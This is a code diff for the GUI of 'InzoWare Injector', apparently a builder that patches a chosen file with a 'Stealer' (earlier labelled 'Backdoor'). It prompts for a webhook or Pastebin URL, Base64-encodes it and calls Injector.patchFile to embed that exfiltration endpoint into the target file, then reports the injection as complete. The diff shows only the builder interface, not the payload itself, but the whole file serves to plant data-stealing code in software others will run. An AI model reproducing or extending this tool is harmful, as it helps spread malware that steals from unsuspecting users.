@@ -1,14 +1,16 @@
-package com.inzo.technologies.inzoware.injector;
+package com.inzo.technologies.inzoware;
 
+import com.inzo.technologies.inzoware.Injector;
 import javax.swing.*;
 import javax.swing.filechooser.FileFilter;
 import java.io.File;
 import com.formdev.flatlaf.FlatDarkLaf;
 import java.util.Base64;
+import javassist.NotFoundException;
 
-public class GUI{
+public class InjectorGUI{
 
-    public static void main(String[] args){
+    public static void main(String[] args) throws NotFoundException{
         try {
             UIManager.setLookAndFeel(new FlatDarkLaf());
         }catch(Throwable ignored){}
@@ -35,7 +37,8 @@ public class GUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: INZO_Technologies,\n" +
-                                "Backdoor Version: 2.11.1\n" +
+                                "Injector Version: 0.0.4\n" +
+                                "Stealer Version: 2.11.1\n" +
                                 "Release Date: \n" +
                                 "Credits: ThnksCJ, Skillnoob, NoWhere",
                         "INZO_Technologies",
@@ -77,7 +80,7 @@ public class GUI{
         String URLlist;
 
         int sender = JOptionPane.showConfirmDialog(null, "Do you Want A Pastebin URL?", "Inzo Ware Injector", JOptionPane.YES_NO_OPTION);
-        pastebinurl = sender == JOptionPane.YES_OPTION;
+         pastebinurl = sender == JOptionPane.YES_OPTION;
 
         URLlist = (String)JOptionPane.showInputDialog(
                 null,
@@ -91,7 +94,16 @@ public class GUI{
         
         String SenderURL = URLlist;
         String encodedSenderURL = Base64.getEncoder().encodeToString(SenderURL.getBytes());
-        System.out.println((pastebinurl ? "PasteBin URL" : "Webhook") + ": " + encodedSenderURL);
+        System.out.println((pastebinurl ? "[INFO] PasteBin URL" : "[INFO] Webhook") + ": " + encodedSenderURL);
+
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(pastebinurl, encodedSenderURL);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
+
+        if(result2){
+            JOptionPane.showMessageDialog(null, "InzoWare injection complete.\nIf this project helped you, considering starring it on GitHub.", "Inzo Ware Injector", JOptionPane.INFORMATION_MESSAGE);
+        }else{
+            JOptionPane.showMessageDialog(null, "InzoWare injection failed.\nPlease create a GitHub issue report if necessary.", "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
+        }
 
     }
 
